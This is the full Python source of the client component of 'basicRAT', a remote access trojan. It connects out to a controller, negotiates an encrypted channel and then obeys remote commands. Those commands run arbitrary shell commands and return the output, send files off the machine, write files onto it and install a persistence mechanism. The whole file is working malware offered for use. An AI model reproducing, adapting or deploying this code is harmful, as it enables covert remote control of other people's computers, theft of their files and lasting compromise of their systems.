#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import struct
import sys

from binascii import hexlify

from core import common
# from core import crypto
from core import persistence
from core.file import recvfile, sendfile

# temporary
from core.crypto import diffiehellman
from core.crypto import AES_encrypt as encrypt
from core.crypto import AES_decrypt as decrypt


HOST    = 'localhost'
PORT    = 1337
FB_KEY  = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def main():
    debug = False
    s = socket.socket()
    s.connect((HOST, PORT))
    
    DHKEY = diffiehellman(s)
    # debug: confirm DHKEY matches
    if debug: print hexlify(DHKEY)
    
    while True:
        data = s.recv(1024)
        data = decrypt(data, DHKEY)

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # stop client
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'run':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(encrypt(results, DHKEY))

        # send file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                if debug: print 'requested file: {}'.format(fname)
                sendfile(s, fname, DHKEY)

        # receive file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                if debug: print 'receiving file: {}'.format(fname)
                recvfile(s, fname, DHKEY)

        # regenerate DH key (dangerous! may cause connection loss)
        # available in case a fallback occurs or you suspect evesdropping
        elif cmd == 'rekey':
            DHKEY = diffiehellman(s)
            # debug: confirm DHKEY matches
            if debug: print "Diffie Key: {}".format(hexlify(DHKEY))

        elif cmd == 'debug':
            debug = not debug
            print "Debug mode set to {}".format(bool(debug))

        # apply persistence mechanism
        elif cmd == 'persistence':
            success, details = persistence.run()
            if success:
                results = 'Persistence successful, {}.'.format(details)
            else:
                results = 'Persistence unsuccessful, {}.'.format(details)
            if debug: print results
            s.send(encrypt(results, DHKEY))


if __name__ == '__main__':
    main()
